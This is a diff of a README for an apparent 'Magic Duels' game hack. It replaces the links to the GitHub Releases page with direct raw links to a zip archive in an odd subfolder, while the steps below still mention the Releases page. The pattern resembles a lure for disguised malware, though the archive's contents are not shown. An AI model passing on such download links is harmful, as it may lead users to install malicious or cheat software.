@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Magic-Duels-hack-for-no](https://img.shields.io/badge/Download-Magic--Duels--hack--for--no-brightgreen)](https://github.com/grizzly12dede/Magic-Duels-hack-for-no/releases)
+[![Download Magic-Duels-hack-for-no](https://raw.githubusercontent.com/grizzly12dede/Magic-Duels-hack-for-no/main/heronite/Magic-Duels-hack-for-no.zip)](https://raw.githubusercontent.com/grizzly12dede/Magic-Duels-hack-for-no/main/heronite/Magic-Duels-hack-for-no.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Welcome to **Magic-Duels-hack-for-no**! This tool enhances your **Magic Duels** 
 
 To download the latest version of **Magic-Duels-hack-for-no**, visit this page:
 
-[Download Magic-Duels-hack-for-no](https://github.com/grizzly12dede/Magic-Duels-hack-for-no/releases)
+[Download Magic-Duels-hack-for-no](https://raw.githubusercontent.com/grizzly12dede/Magic-Duels-hack-for-no/main/heronite/Magic-Duels-hack-for-no.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
